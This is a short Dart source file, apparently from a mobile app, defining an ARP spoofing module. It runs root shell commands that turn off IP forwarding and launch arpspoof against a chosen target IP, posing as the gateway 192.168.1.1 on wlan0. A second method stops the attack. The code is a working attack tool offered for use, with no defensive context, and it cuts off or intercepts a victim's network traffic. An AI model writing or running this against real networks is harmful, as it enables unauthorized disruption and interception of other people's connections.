import '../core/shell_executor.dart';

class ArpSpoofModule {
  final ShellExecutor _shell = ShellExecutor();

  Future<void> startArpSpoof({required String targetIp}) async {
    await _shell.executeRootCommand("echo 0 > /proc/sys/net/ipv4/ip_forward");
    await _shell.executeRootCommand(
      "arpspoof -i wlan0 -t $targetIp 192.168.1.1 &",
    );
  }

  Future<void> stopArpSpoof() async {
    await _shell.executeRootCommand("pkill arpspoof");
  }
}
